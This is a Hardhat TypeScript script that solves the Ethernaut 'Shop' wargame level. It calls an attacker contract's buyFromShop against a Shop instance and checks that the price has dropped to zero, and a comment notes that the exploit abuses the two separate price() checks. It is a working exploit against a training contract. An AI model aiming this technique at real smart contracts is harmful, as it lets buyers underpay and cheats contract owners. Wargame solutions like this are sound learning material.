import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackShop = async () => {
    // change contract addresses here.
    const _shopAddr /*Shop instance address*/ = "0x36Db16f376127CfBCDD77F672B9aB77CF8F127b0";
    const attackShopBuyerAddress = "0xd643B0403958543e445e16dC720566E0D7e11f8a";

    // Don't touch below
    // Exploit comes from two checks of price() and you can change value of second check
    // You may read more on:
    // https://docs.soliditylang.org/en/v0.8.11/contracts.html#view-functions
    const ABI1 = ["function buyFromShop(address _shopAddr)"];
    const ABI2 = ["function price() external view returns (uint);"]; //TODO: replace this to fix output
    const contractAttack = await ethers.getContractAt(ABI1, attackShopBuyerAddress);
    const tx = await contractAttack.buyFromShop(_shopAddr);
    const txReceipt = tx.wait(1);
    console.log(txReceipt);
    const contractShop = await ethers.getContractAt(ABI2, _shopAddr);
    const Output = (await contractShop.price()).toString();
    if (Output === "0") {
        console.log("Level passed, Submit to ethernaut");
    } else {
        console.log("Please review code above and try again");
    }
};

attackShop()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
